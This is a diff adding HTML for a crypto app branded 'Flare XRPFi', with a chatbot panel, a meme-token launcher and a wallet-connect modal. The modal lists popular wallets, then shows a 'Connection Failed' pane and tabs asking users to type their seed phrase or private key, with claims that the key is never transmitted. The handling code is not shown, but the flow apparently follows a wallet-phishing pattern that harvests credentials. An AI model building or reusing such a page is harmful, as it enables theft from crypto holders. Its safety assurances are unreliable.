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" alt="Flare" style="width:100%;height:100%;object-fit:contain;"></div>
+            <div class="bbub">
+              Hey! I'm the Flare XRPFi AI. I help you earn with XRP — mint FXRP, find the best XRP pools, check airdrops, and manage your XRP DeFi portfolio on Flare.<br><br><strong>What would you like to do with XRP?</strong>
+              <div class="chips">
+                <span class="chip" onclick="qa('Best XRP yield pools?')">Best XRP APY</span>
+                <span class="chip" onclick="qa('How do I mint FXRP?')">Mint FXRP</span>
+                <span class="chip" onclick="qa('My XRP airdrop status')">XRP airdrop</span>
+                <span class="chip" onclick="qa('XRP price?')">/price XRP</span>
+                <span class="chip" onclick="qa('What is XRPFi?')">What is XRPFi?</span>
+                <span class="chip" onclick="qa('/claim XRP')">/claim XRP</span>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="cinp">
+          <input type="text" id="cin" placeholder="Ask about XRP on Flare..." onkeydown="if(event.key==='Enter')sm()">
+          <button class="sbtn" onclick="sm()">➤</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- MEME TOKEN LAUNCHER -->
+    <div class="pnl" id="p-meme">
+      <div style="background:linear-gradient(135deg,#0f172a,#1e293b);border-radius:14px;padding:18px 16px;margin-bottom:13px;text-align:center;position:relative;overflow:hidden;">
+        <div style="position:absolute;inset:0;background:radial-gradient(circle at 50% 0%,rgba(249,115,22,0.2),transparent 60%);"></div>
+        <div style="font-size:40px;margin-bottom:10px;position:relative;z-index:1;">🚀</div>
+        <div style="font-size:17px;font-weight:600;color:#fff;margin-bottom:5px;position:relative;z-index:1;">Launch XRP Meme Token</div>
+        <div style="font-size:11px;color:rgba(255,255,255,0.5);line-height:1.5;position:relative;z-index:1;">Create, deploy and manage your XRP meme token on Flare Network in minutes. No coding required.</div>
+      </div>
+
+      <div class="slbl">Token Details</div>
+      <div class="card">
+        <div class="fg f2" style="margin-bottom:9px;">
+          <div><div class="fl2">Token Name</div><input class="fi2" type="text" placeholder="e.g. FlareRocket"></div>
+          <div><div class="fl2">Ticker Symbol</div><input class="fi2" type="text" placeholder="e.g. FRKT"></div>
+        </div>
+        <div class="fg f2" style="margin-bottom:9px;">
+          <div><div class="fl2">Total Supply</div><input class="fi2" type="number" placeholder="e.g. 1,000,000,000"></div>
+          <div><div class="fl2">Decimals</div><input class="fi2" type="number" value="18"></div>
+        </div>
+        <div style="margin-bottom:9px;"><div class="fl2">Description</div><textarea class="fi2" rows="2" placeholder="What is your meme token about?" style="resize:none;line-height:1.5;"></textarea></div>
+      </div>
+
+      <div class="slbl">Token Configuration</div>
+      <div class="card">
+        <div class="tok">
+          <div style="flex:1;"><div class="tn">Liquidity Pool</div><div class="tsub">Pair with XRP on Flare DEX</div></div>
+          <div style="display:flex;gap:5px;">
+            <span class="tag tg" style="cursor:pointer;">XRP/TOKEN</span>
+            <span class="tag tb" style="cursor:pointer;">USDT/TOKEN</span>
+          </div>
+        </div>
+        <div class="tok">
+          <div style="flex:1;"><div class="tn">Initial Liquidity</div><div class="tsub">XRP to seed the pool</div></div>
+          <input class="fi2" type="number" placeholder="500 XRP" style="width:110px;text-align:right;">
+        </div>
+        <div class="tok">
+          <div style="flex:1;"><div class="tn">Buy/Sell Tax</div><div class="tsub">% on each transaction</div></div>
+          <input class="fi2" type="number" placeholder="5%" style="width:80px;text-align:right;">
+        </div>
+        <div class="tok">
+          <div style="flex:1;"><div class="tn">Anti-whale limit</div><div class="tsub">Max wallet % of supply</div></div>
+          <input class="fi2" type="number" placeholder="2%" style="width:80px;text-align:right;">
+        </div>
+      </div>
+
+      <div class="slbl">Tokenomics</div>
+      <div class="card">
+        <div class="tok"><div style="width:12px;height:12px;border-radius:3px;background:#E8234A;flex-shrink:0;"></div><div style="flex:1;margin-left:8px;"><div class="tn">Liquidity Pool</div></div><div class="trr"><div class="tp2">40%</div></div></div>
+        <div class="tok"><div style="width:12px;height:12px;border-radius:3px;background:var(--xrp);flex-shrink:0;"></div><div style="flex:1;margin-left:8px;"><div class="tn">Community Airdrop</div></div><div class="trr"><div class="tp2">30%</div></div></div>
+        <div class="tok"><div style="width:12px;height:12px;border-radius:3px;background:var(--amber);flex-shrink:0;"></div><div style="flex:1;margin-left:8px;"><div class="tn">Team & Dev</div></div><div class="trr"><div class="tp2">15%</div></div></div>
+        <div class="tok"><div style="width:12px;height:12px;border-radius:3px;background:var(--green);flex-shrink:0;"></div><div style="flex:1;margin-left:8px;"><div class="tn">Marketing</div></div><div class="trr"><div class="tp2">15%</div></div></div>
+      </div>
+
+      <div class="slbl">Deployment Cost</div>
+      <div class="rcard xcard">
+        <div class="rtit xc">🔵 Estimated Launch Cost</div>
+        <div class="rsub">Paid in XRP on Flare Network</div>
+        <div class="rrow"><span class="rk">Contract deploy fee</span><span class="rv">~2 XRP (~$1.17)</span></div>
+        <div class="rrow"><span class="rk">Liquidity seed</span><span class="rv xv">500 XRP (~$292)</span></div>
+        <div class="rrow"><span class="rk">Platform fee</span><span class="rv">10 XRP (~$5.84)</span></div>
+        <div style="border-top:1px solid var(--fb);margin-top:8px;padding-top:8px;" class="rrow"><span class="rk" style="font-weight:600;color:var(--fd);">Total</span><span class="rv up" style="font-size:13px;">~512 XRP (~$299)</span></div>
+      </div>
+
+      <button class="cbtn xbtn" onclick="showWalletModal()" style="font-size:14px;padding:13px;">🚀 Deploy Meme Token on Flare</button>
+      <div style="text-align:center;font-size:10px;color:var(--fg);margin-top:10px;line-height:1.5;">Powered by Flare Network · Secured by FTSO · XRP-native</div>
+    </div>
+
+  </div>
+
+
+        <!-- WALLET MODAL -->
+        <div id="wallet-modal" style="display:none;position:fixed;inset:0;z-index:999;background:rgba(0,0,0,0.55);backdrop-filter:blur(4px);align-items:flex-end;justify-content:center;">
+          <div id="modal-inner" style="background:#fff;border-radius:20px 20px 0 0;width:100%;max-width:430px;padding:0 0 30px;max-height:92vh;overflow-y:auto;">
+
+            <!-- Modal handle + header -->
+            <div style="text-align:center;padding:10px 0 0;"><div style="width:36px;height:4px;border-radius:4px;background:var(--fb);margin:0 auto;"></div></div>
+            <div style="display:flex;align-items:center;justify-content:space-between;padding:14px 18px 0;">
+              <div style="font-size:15px;font-weight:600;color:var(--fd);">Connect Wallet</div>
+              <button onclick="closeWalletModal()" style="width:28px;height:28px;border-radius:50%;border:1px solid var(--fb);background:var(--fl);cursor:pointer;font-size:14px;display:flex;align-items:center;justify-content:center;color:var(--fg);">✕</button>
+            </div>
+
+            <!-- TAB SWITCHER -->
+            <div style="display:flex;gap:0;margin:14px 18px 0;border:1px solid var(--fbc);border-radius:10px;overflow:hidden;">
+              <button id="tab-wallets" onclick="switchTab('wallets')" style="flex:1;padding:9px;font-size:11px;font-weight:600;border:none;background:var(--xrp);color:#fff;cursor:pointer;">Wallets</button>
+              <button id="tab-import" onclick="switchTab('import')" style="flex:1;padding:9px;font-size:11px;font-weight:600;border:none;background:#fff;color:var(--fg);cursor:pointer;">Import / Seed</button>
+              <button id="tab-key" onclick="switchTab('key')" style="flex:1;padding:9px;font-size:11px;font-weight:600;border:none;background:#fff;color:var(--fg);cursor:pointer;">Private Key</button>
+            </div>
+
+            <!-- ── TAB: WALLETS ── -->
+            <div id="pane-wallets" style="padding:14px 18px 0;">
+              <div style="font-size:10px;color:var(--fg);margin-bottom:10px;font-weight:500;letter-spacing:.04em;text-transform:uppercase;">XRP & Flare Wallets</div>
+
+              <!-- Xaman (XUMM) -->
+              <div onclick="selectWallet('Xaman (XUMM)')" style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:#fff;border:1px solid var(--fbc);border-radius:12px;margin-bottom:8px;cursor:pointer;transition:all .18s;" onmouseover="this.style.borderColor='var(--xrp)'" onmouseout="this.style.borderColor='var(--fbc)'">
+                <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,#1B5E8C,#3B9EBF);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">🌊</div>
+                <div style="flex:1;"><div style="font-size:13px;font-weight:600;color:var(--fd);">Xaman (XUMM)</div><div style="font-size:10px;color:var(--fg);">Official XRPL mobile wallet · Most popular</div></div>
+                <div style="font-size:10px;padding:2px 8px;background:var(--gdim);color:var(--green);border-radius:20px;border:1px solid rgba(22,163,74,.2);font-weight:600;">Recommended</div>
+              </div>
+
+              <!-- Bifrost -->
+              <div onclick="selectWallet('Bifrost')" style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:#fff;border:1px solid var(--fbc);border-radius:12px;margin-bottom:8px;cursor:pointer;transition:all .18s;" onmouseover="this.style.borderColor='var(--xrp)'" onmouseout="this.style.borderColor='var(--fbc)'">
+                <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,#7C3AED,#4F46E5);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">⚡</div>
+                <div style="flex:1;"><div style="font-size:13px;font-weight:600;color:var(--fd);">Bifrost Wallet</div><div style="font-size:10px;color:var(--fg);">Multi-chain · XRP + Flare native support</div></div>
+                <div style="font-size:10px;padding:2px 8px;background:var(--xrpdim);color:var(--xrp);border-radius:20px;border:1px solid rgba(52,106,169,.2);font-weight:600;">Flare Native</div>
+              </div>
+
+              <!-- Ledger -->
+              <div onclick="selectWallet('Ledger')" style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:#fff;border:1px solid var(--fbc);border-radius:12px;margin-bottom:8px;cursor:pointer;transition:all .18s;" onmouseover="this.style.borderColor='var(--xrp)'" onmouseout="this.style.borderColor='var(--fbc)'">
+                <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,#111,#333);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">🔐</div>
+                <div style="flex:1;"><div style="font-size:13px;font-weight:600;color:var(--fd);">Ledger Hardware</div><div style="font-size:10px;color:var(--fg);">Nano S / Nano X · Cold storage</div></div>
+                <div style="font-size:10px;padding:2px 8px;background:#f1f0ec;color:#444;border-radius:20px;border:1px solid #ddd;font-weight:600;">Hardware</div>
+              </div>
+
+              <!-- Gem Wallet -->
+              <div onclick="selectWallet('Gem Wallet')" style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:#fff;border:1px solid var(--fbc);border-radius:12px;margin-bottom:8px;cursor:pointer;transition:all .18s;" onmouseover="this.style.borderColor='var(--xrp)'" onmouseout="this.style.borderColor='var(--fbc)'">
+                <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,#0EA5E9,#0284C7);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">💎</div>
+                <div style="flex:1;"><div style="font-size:13px;font-weight:600;color:var(--fd);">Gem Wallet</div><div style="font-size:10px;color:var(--fg);">Browser extension · XRPL & EVM</div></div>
+              </div>
+
+              <!-- Crossmark -->
+              <div onclick="selectWallet('Crossmark')" style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:#fff;border:1px solid var(--fbc);border-radius:12px;margin-bottom:8px;cursor:pointer;transition:all .18s;" onmouseover="this.style.borderColor='var(--xrp)'" onmouseout="this.style.borderColor='var(--fbc)'">
+                <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,#E8234A,#b91c1c);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">✚</div>
+                <div style="flex:1;"><div style="font-size:13px;font-weight:600;color:var(--fd);">Crossmark</div><div style="font-size:10px;color:var(--fg);">Browser extension · XRPL focused</div></div>
+              </div>
+
+              <!-- MetaMask -->
+              <div onclick="selectWallet('MetaMask')" style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:#fff;border:1px solid var(--fbc);border-radius:12px;margin-bottom:8px;cursor:pointer;transition:all .18s;" onmouseover="this.style.borderColor='var(--xrp)'" onmouseout="this.style.borderColor='var(--fbc)'">
+                <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,#F6851B,#E2761B);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">🦊</div>
+                <div style="flex:1;"><div style="font-size:13px;font-weight:600;color:var(--fd);">MetaMask</div><div style="font-size:10px;color:var(--fg);">EVM wallet · Flare Network compatible</div></div>
+              </div>
+
+              <!-- WalletConnect -->
+              <div onclick="selectWallet('WalletConnect')" style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:#fff;border:1px solid var(--fbc);border-radius:12px;margin-bottom:8px;cursor:pointer;transition:all .18s;" onmouseover="this.style.borderColor='var(--xrp)'" onmouseout="this.style.borderColor='var(--fbc)'">
+                <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,#3B99FC,#2563EB);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">🔵</div>
+                <div style="flex:1;"><div style="font-size:13px;font-weight:600;color:var(--fd);">WalletConnect</div><div style="font-size:10px;color:var(--fg);">Scan QR · Connect any mobile wallet</div></div>
+              </div>
+
+              <!-- Other Wallet -->
+              <div onclick="switchTab('import')" style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:var(--fl);border:1px dashed var(--fbc);border-radius:12px;cursor:pointer;transition:all .18s;">
+                <div style="width:38px;height:38px;border-radius:10px;background:#fff;border:1px solid var(--fbc);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;">⋯</div>
+                <div><div style="font-size:13px;font-weight:600;color:var(--fg);">Other Wallet</div><div style="font-size:10px;color:var(--fg);">Import via seed phrase or private key</div></div>
+              </div>
+            </div>
+
+            <!-- ── TAB: IMPORT SEED ── -->
+            <div id="pane-import" style="display:none;padding:14px 18px 0;">
+              <div style="background:#fffbeb;border:1px solid #fcd34d;border-radius:10px;padding:10px 12px;margin-bottom:14px;display:flex;gap:8px;">
+                <div style="font-size:16px;flex-shrink:0;">⚠️</div>
+                <div style="font-size:11px;color:#92400e;line-height:1.5;">Never share your seed phrase with anyone. Flare Smart Money will never ask for it outside this encrypted import flow.</div>
+              </div>
+              <div style="margin-bottom:12px;">
+                <div style="font-size:11px;font-weight:600;color:var(--fg);margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em;">Wallet Type</div>
+                <div style="display:flex;gap:7px;">
+                  <button id="seed-xrp-btn" onclick="setSeedType('xrp')" style="flex:1;padding:8px;border-radius:9px;border:2px solid var(--xrp);background:var(--xrpdim);color:var(--xrp);font-size:11px;font-weight:600;cursor:pointer;">XRP / XRPL</button>
+                  <button id="seed-evm-btn" onclick="setSeedType('evm')" style="flex:1;padding:8px;border-radius:9px;border:1px solid var(--fbc);background:#fff;color:var(--fg);font-size:11px;font-weight:500;cursor:pointer;">EVM / Flare</button>
+                </div>
+              </div>
+              <div style="margin-bottom:12px;">
+                <div style="font-size:11px;font-weight:600;color:var(--fg);margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em;">Seed Phrase (12 or 24 words)</div>
+                <textarea id="seed-input" placeholder="Enter your seed phrase words separated by spaces..." style="width:100%;padding:10px 12px;background:#fff;border:1px solid var(--fb);border-radius:10px;font-size:12px;color:var(--fd);outline:none;resize:none;height:90px;line-height:1.6;font-family:'DM Sans',sans-serif;" oninput="validateSeed()"></textarea>
+                <div id="seed-hint" style="font-size:10px;color:var(--fg);margin-top:4px;">Enter 12 or 24 words</div>
+              </div>
+              <div style="margin-bottom:14px;">
+                <div style="font-size:11px;font-weight:600;color:var(--fg);margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em;">Wallet Name (optional)</div>
+                <input type="text" placeholder="My XRP Wallet" style="width:100%;padding:9px 12px;background:#fff;border:1px solid var(--fb);border-radius:10px;font-size:12px;color:var(--fd);outline:none;">
+              </div>
+              <button id="import-btn" onclick="importSuccess('seed')" style="width:100%;padding:12px;background:linear-gradient(135deg,#346AA9,#1a4a7a);color:#fff;border:none;border-radius:11px;font-size:13px;font-weight:600;cursor:pointer;opacity:.5;" disabled>Import Wallet</button>
+            </div>
+
+            <!-- ── TAB: PRIVATE KEY ── -->
+            <div id="pane-key" style="display:none;padding:14px 18px 0;">
+              <div style="background:#fef2f2;border:1px solid #fca5a5;border-radius:10px;padding:10px 12px;margin-bottom:14px;display:flex;gap:8px;">
+                <div style="font-size:16px;flex-shrink:0;">🔴</div>
+                <div style="font-size:11px;color:#991b1b;line-height:1.5;">Importing a private key is high risk. Only use this on a trusted private device. Your key is never transmitted to any server.</div>
+              </div>
+              <div style="margin-bottom:12px;">
+                <div style="font-size:11px;font-weight:600;color:var(--fg);margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em;">Wallet Type</div>
+                <div style="display:flex;gap:7px;">
+                  <button id="key-xrp-btn" onclick="setKeyType('xrp')" style="flex:1;padding:8px;border-radius:9px;border:2px solid var(--xrp);background:var(--xrpdim);color:var(--xrp);font-size:11px;font-weight:600;cursor:pointer;">XRP / XRPL</button>
+                  <button id="key-evm-btn" onclick="setKeyType('evm')" style="flex:1;padding:8px;border-radius:9px;border:1px solid var(--fbc);background:#fff;color:var(--fg);font-size:11px;font-weight:500;cursor:pointer;">EVM / Flare</button>
+                </div>
+              </div>
+              <div style="margin-bottom:12px;">
+                <div style="font-size:11px;font-weight:600;color:var(--fg);margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em;">Private Key</div>
+                <div style="position:relative;">
+                  <input id="key-input" type="password" placeholder="Enter your private key..." style="width:100%;padding:9px 38px 9px 12px;background:#fff;border:1px solid var(--fb);border-radius:10px;font-size:12px;color:var(--fd);outline:none;font-family:'DM Mono',monospace;" oninput="validateKey()">
+                  <button onclick="toggleKeyVis()" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:14px;color:var(--fg);" id="key-vis-btn">👁</button>
+                </div>
+                <div id="key-hint" style="font-size:10px;color:var(--fg);margin-top:4px;">XRPL: starts with s · EVM: 64 hex chars</div>
+              </div>
+              <div style="margin-bottom:14px;">
+                <div style="font-size:11px;font-weight:600;color:var(--fg);margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em;">Wallet Name (optional)</div>
+                <input type="text" placeholder="My XRP Wallet" style="width:100%;padding:9px 12px;background:#fff;border:1px solid var(--fb);border-radius:10px;font-size:12px;color:var(--fd);outline:none;">
+              </div>
+              <button id="key-btn" onclick="importSuccess('key')" style="width:100%;padding:12px;background:linear-gradient(135deg,#346AA9,#1a4a7a);color:#fff;border:none;border-radius:11px;font-size:13px;font-weight:600;cursor:pointer;opacity:.5;" disabled>Import Private Key</button>
+            </div>
+
+            <!-- Connecting state (shown after wallet selected) -->
+            <!-- Connecting spinner state -->
+            <div id="pane-connecting" style="display:none;padding:36px 18px;text-align:center;">
+              <div style="width:56px;height:56px;border-radius:50%;border:3px solid var(--fbc);border-top-color:var(--xrp);animation:wspin 0.9s linear infinite;margin:0 auto 16px;"></div>
+              <div style="font-size:14px;font-weight:600;color:var(--fd);margin-bottom:6px;" id="connecting-label">Connecting to Xaman…</div>
+              <div style="font-size:11px;color:var(--fg);">Waiting for wallet approval</div>
+            </div>
+
+            <!-- Connection error state -->
+            <div id="pane-error" style="display:none;padding:24px 18px;">
+              <div style="text-align:center;margin-bottom:20px;">
+                <div style="width:56px;height:56px;border-radius:50%;background:var(--rdim);border:2px solid rgba(239,68,68,.25);display:flex;align-items:center;justify-content:center;font-size:26px;margin:0 auto 12px;">✕</div>
+                <div style="font-size:15px;font-weight:600;color:var(--fr);margin-bottom:5px;">Connection Failed</div>
